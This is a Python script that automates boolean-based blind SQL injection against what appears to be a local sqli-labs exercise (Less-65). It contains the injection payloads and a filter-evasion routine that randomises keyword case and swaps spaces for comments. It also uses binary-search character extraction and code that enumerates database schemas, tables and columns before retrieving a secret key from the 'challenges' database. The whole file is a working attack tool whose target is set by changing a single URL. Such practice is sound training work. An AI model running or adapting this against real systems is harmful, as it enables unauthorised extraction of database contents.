#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import sys
import random

#payload62 = "0')|()--+"  # Example: 0"or()or"="1 或0' or()or '='1
payload63 = "0'|()%23"
payload64 = "0))|()%23"
payload65 = '0")|()%23'
payload=payload65
success_symbol = "Your Login name :"  # The successful flag of execute
url = "http://127.0.0.1:9090/Less-65/?id="
exe_count = 0  # Count the total execute times
sleep_time = 5
error_time = 1

# Get the character from ascii.txt
with open('/home/nomansky/ascii.txt') as f:
    ascii_txt = [int(x.strip()) for x in f.readlines()]
    ascii_txt.sort()

system_schema_names = ['information_schema', 'test',
                       'mysql', 'performance_schema', 'phpmyadmin']

random_up_low_keywords = ['select', 'union', 'from', 'limit', 'length']

random_up_low_keywords.append('ascii')
random_up_low_keywords.append('substring')
random_up_low_keywords.append('information_schema')
random_up_low_keywords.append('schemata')
random_up_low_keywords.append('tables')
random_up_low_keywords.append('columns')
random_up_low_keywords.append('schema_name')
random_up_low_keywords.append('table_name')
random_up_low_keywords.append('column_name')


def temper(tempPayload):
    global random_up_low_keywords
    for tempKeyword in random_up_low_keywords:
        tempPayload = tempPayload.replace(
            tempKeyword, getRandomType(tempKeyword))
    tempPayload = tempPayload.replace(" ", "/**/")
    tempPayload = tempPayload.replace(" ", "%a0")
    return tempPayload


def getRandomType(keywords):
    random_int = random.randint(0, len(keywords) - 1)
    tempList = list(keywords)
    tempList[random_int] = tempList[random_int].upper()
    return "".join(tempList)


def getPayload(database_name, table_name, column_name, where, indexOfResult, indexOfChar, op, mid):
    global payload
    startStr = payload.split("()")[0]
    endStr = payload.split("()")[1]
    # ((asCIi(sUBString((sELEct/**/scheMA_Name/**/FRom/**/inforMATion_scheMa.schemaTa/**//**/liMit/**/0,1),1,1)))>0)
    temppayload = "((ascii(substring((select {} from {}.{} {} limit {},1),{},1))){}{})".format(
        column_name, database_name, table_name, where, indexOfResult, indexOfChar, op, mid)
    temppayload = startStr + temppayload + endStr
    # temper
    temppayload = temper(temppayload)
    return temppayload


def exec(database_name, table_name, column_name, where, indexOfResult, indexOfChar, op, mid):
    global success_symbol
    global url
    global exe_count
    tempurl = url + getPayload(database_name, table_name,
                               column_name, where, indexOfResult, indexOfChar, op, mid)
    content = requests.get(tempurl).text
    exe_count += 1
    if success_symbol in content:
        return True
    else:
        return False


def binarySearch(database_name, table_name, column_name, where, indexOfResult, indexOfChar):
    lo, hi = 0, len(ascii_txt) - 1
    e_flag = False
    while lo <= hi:
        mid = int((lo + hi) // 2)
        if exec(database_name, table_name, column_name, where, str(indexOfResult), str(indexOfChar + 1), '<',
                str(ascii_txt[mid])):
            hi = mid - 1
            e_flag = True
        elif exec(database_name, table_name, column_name, where, str(indexOfResult), str(indexOfChar + 1), '>',
                  str(ascii_txt[mid])):
            lo = mid + 1
            e_flag = True
        else:
            if e_flag:
                return chr(ascii_txt[mid])
            elif exec(database_name, table_name, column_name, where, str(indexOfResult), str(indexOfChar + 1), '=',
                  str(ascii_txt[mid])):
                return chr(ascii_txt[mid])
            else:
                return None


def getAllData(database_name, table_name, column_name, where):
    allData = []
    for i in range(100):
        counter = 0
        data = ""
        for j in range(100):
            counter += 1
            temp = binarySearch(database_name, table_name,
                                column_name, where, i, j)
            if not temp:
                break
            sys.stdout.write(temp)
            sys.stdout.flush()
            data += temp
        if counter == 1:
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()
        allData.append(data)
    return allData


def getAllSchemaNames():
    return getAllData(column_name="schema_name", table_name="schemata", database_name="information_schema", where="")


def getAllTableNames(schema_name):
    return getAllData(column_name="table_name", table_name="tables", database_name="information_schema",
                      where="where(table_schema='{}')".format(schema_name))


def getAllColumnNames(table_name, schema_name):
    return getAllData(column_name="column_name", table_name="columns", database_name="information_schema",
                      where="where(table_name='{}' and table_schema='{}')".format(table_name, schema_name))


def getSecretKey(column_name, table_name):
    return getAllData(column_name=column_name, table_name=table_name, database_name="challenges", where="")


def hack():
    text = ("{}\n"
            "正在获取所有数据库 ...").format('=' * 30)
    print(text)
    # allSchemaNames = getAllSchemaNames()
    allSchemaNames = ['challenges']
    text = ("所有数据库名获取完毕!\n"
            "{}\n"
            "正在获取所有数据库表名").format('=' * 30)
    print(text)
    tableDic = {}
    columnDic = {}
    allUserSchemaNames = []
    for schema_name in allSchemaNames:
        text = ("{}"
                "当前数据库： {} \t"
                ).join("\n").format("=" * 30, schema_name)
        print(text)
        if schema_name in system_schema_names:
            print('MySQL自带系统数据库，智能忽略!')
            break
        else:
            print("")
            allUserSchemaNames.append(schema_name)
            tableDic[schema_name] = getAllTableNames(schema_name)
            columnDic[schema_name] = {x: None for x in tableDic[schema_name]}
    print("所有表名获取完毕")
    print("=" * 30)
    print("正在获取所有表列名...")
    for schema_name in allUserSchemaNames:
        print('-' * 30)
        for table_name in tableDic[schema_name]:
            print("当前数据库：{}\t当前表名：{}".format(schema_name, table_name))
            columnDic[schema_name][table_name] = getAllColumnNames(table_name, schema_name)
            sec_tb = table_name
    print("所有列名获取完毕!")
    print("=" * 30)
    print(columnDic)
    print("Get data from {}".format(columnDic['challenges'][sec_tb][2]))
    getSecretKey(columnDic['challenges'][sec_tb][2],sec_tb)


if __name__ == '__main__':
    hack()
    print("The execute count is {}".format(exe_count))
